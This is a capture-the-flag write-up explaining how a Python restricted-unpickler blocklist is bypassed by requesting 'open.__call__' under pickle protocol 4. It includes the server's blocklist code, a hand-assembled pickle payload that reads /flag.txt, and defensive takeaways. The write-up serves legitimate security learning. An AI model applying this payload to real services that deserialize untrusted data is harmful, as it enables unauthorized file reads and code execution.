# Mind Blowers (May 15, 2026)

**Category:** misc  
**Points:** 244  
**Files Provided:** server.py  
**Connection:** `nc tjc.tf 31422`

## Challenge Description

"Rick has open sourced his mind blowers program! Now you can upload your own mind blowers and view them!"

## Step 1: Exploring

The server base64-decodes your input and unpickles it. The error message `blocked: could not find MARK` (MARK is a pickle opcode) gives it away before you even read the source.

server.py:

```
BLOCKED_NAMES = {"eval","exec","compile","__import__","open",
                 "breakpoint","input","exit","quit"}
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module != "builtins": raise pickle.UnpicklingError("banned")
        if name in BLOCKED_NAMES: raise pickle.UnpicklingError("blocked")
        return super().find_class(module, name)
```

The unpickled value is interpolated into `f"Here is your memory: {result}"` and sent back - so the return value itself is the exfil channel.

## Step 2: The Bypass

In CPython, when the pickle protocol is >= 4, `find_class` resolves names via `_getattribute`, which walks dotted paths:

```
for subpath in name.split('.'):
    obj = getattr(obj, subpath)
```

The blocklist checks `name in BLOCKED_NAMES` - exact string equality. So `"open.__call__"` is not equal to `"open"`, passes the check, and resolves to `builtins.open.__call__`, which behaves identically to `open` when invoked.

## Step 3: Building the Payload

Target: `getattr(open("/flag.txt"), "read")()`. Pickle stack plan:

```
\x80\x04                            # PROTO 4 (enables dotted resolution)
cbuiltins\ngetattr\n                # GLOBAL getattr
cbuiltins\nopen.__call__\n          # GLOBAL open.__call__  <-- bypass
Vflag.txt\n  \x85  R                # open("flag.txt") -> fd
Vread\n      \x86  R                # getattr(fd, "read") -> bound method
)            R                      # bound_method() -> contents
.                                   # STOP
```

## Step 4: Running It

I reproduced the sandbox locally first, ran the payload against a known file, confirmed RCE-grade read, then tried paths on the remote. `flag.txt` failed; `/flag.txt` hit:

`tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}`

## Takeaways
- Pickle sandboxes that compare names with string equality are bypassable from protocol 4 onward - the `_getattribute` helper resolves dotted paths, so `open.__call__` slips through a blocklist of `{"open", ...}`.
- To actually be safe, split on `.` and check every segment, or use an allowlist of full names.
- If the unpickled value is interpolated into a response string, you don't need a separate exfil channel.

